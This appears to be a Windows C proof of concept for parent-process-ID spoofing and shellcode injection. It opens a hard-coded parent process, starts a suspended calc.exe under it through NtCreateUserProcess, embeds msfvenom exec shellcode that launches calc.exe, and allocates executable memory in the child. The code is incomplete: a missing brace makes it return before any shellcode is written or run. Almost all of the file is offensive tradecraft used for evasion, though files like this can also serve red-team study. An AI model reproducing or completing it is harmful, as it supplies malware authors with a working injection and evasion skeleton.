#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include "structs.h"

int wmain()
{
	// Get handle on parent process
	ZwOpenProcess = &ZwOpenProcess10;
	ZwClose = &ZwClose10;

	HANDLE hParentProc = NULL;
	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID clientId = { 0 };
	
	clientId.UniqueProcess = (HANDLE)25764; //PPID
	clientId.UniqueThread = (HANDLE)0;

	ZwOpenProcess(&hParentProc, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
	wprintf(L"Parent process handle: %p\n", hParentProc);

	// Create child process
	NtCreateUserProcess = &NtCreateUserProcess10;
	UNICODE_STRING uImageName;
	WCHAR imageName[] = { L"\\??\\C:\\Windows\\System32\\calc.exe" };
	
	uImageName.Buffer = imageName;
	uImageName.Length = sizeof(imageName) - sizeof(UNICODE_NULL);
	uImageName.MaximumLength = sizeof(imageName);
	PUNICODE_STRING pProcessImageName = &uImageName;

	PS_CREATE_INFO procInfo;
	RTL_USER_PROCESS_PARAMETERS userParams;
	PS_ATTRIBUTE_LIST attrList;

	NTSTATUS status = 0x00000103;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	char data[2 * sizeof(ULONGLONG)] = { 'Y', 0x00, 0x3D, 0x00, 'Q', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	
	RtlSecureZeroMemory(&userParams, sizeof(RTL_USER_PROCESS_PARAMETERS));
	RtlSecureZeroMemory(&attrList, sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE));
	RtlSecureZeroMemory(&procInfo, sizeof(PS_CREATE_INFO));

	userParams.MaximumLength = sizeof(RTL_USER_PROCESS_PARAMETERS);
	userParams.Length = sizeof(RTL_USER_PROCESS_PARAMETERS);
	attrList.TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
	procInfo.Size = sizeof(PS_CREATE_INFO);

	userParams.Environment = (WCHAR*)data;
	userParams.EnvironmentSize = sizeof(data);
	userParams.EnvironmentVersion = 0;
	userParams.Flags = RTL_USER_PROCESS_PARAMETERS_NORMALIZED;

	attrList.Attributes[0].Attribute = PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE);
	attrList.Attributes[0].Size = pProcessImageName->Length;
	attrList.Attributes[0].Value = (ULONG_PTR)pProcessImageName->Buffer;

	attrList.Attributes[1].Attribute = PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE);
	attrList.Attributes[1].Size = sizeof(ULONG_PTR);
	attrList.Attributes[1].ValuePtr = hParentProc;
	
	status = NtCreateUserProcess(&hProcess, &hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, &userParams, &procInfo, &attrList);
	wprintf(L"Child process handle: %p\n", hProcess);

	// msfvenom -a x64 -p windows/x64/exec --platform windows cmd=calc.exe
	BYTE shellcode[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };

	SIZE_T size = sizeof(shellcode);

	NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
	ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
	ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;

	void* moduleNtDll = GetModuleHandle("ntdll");
	void* ldrInitThunk = GetProcAddress(moduleNtDll, "LdrInitializeThunk");

	PVOID remoteAddr = NULL;
	status = NtAllocateVirtualMemory(hProcess, &remoteAddr, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(status)
		wprintf(L"Error: %d", status);
		return 0;
	
	wprintf(L"NtAllocateVirtualMemory: %d\n", status);
	
	return 0;
}
